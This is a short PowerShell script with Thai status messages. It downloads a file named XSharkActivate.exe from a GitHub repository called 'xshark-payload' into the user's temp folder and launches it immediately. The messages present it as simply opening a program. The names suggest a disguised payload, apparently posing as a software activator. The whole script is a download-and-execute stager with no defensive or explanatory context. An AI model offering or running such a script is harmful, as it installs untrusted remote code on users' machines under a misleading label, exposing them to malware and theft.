$url = "https://github.com/puppup3336-lab/xshark-payload/releases/tag/V1.0"
$dest = "$env:TEMP\XSharkActivate.exe"

Write-Host "กำลังเรียกใช้โปรแกรม..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $dest

Write-Host "กำลังเปิดโปรแกรม..." -ForegroundColor Green
Start-Process $dest
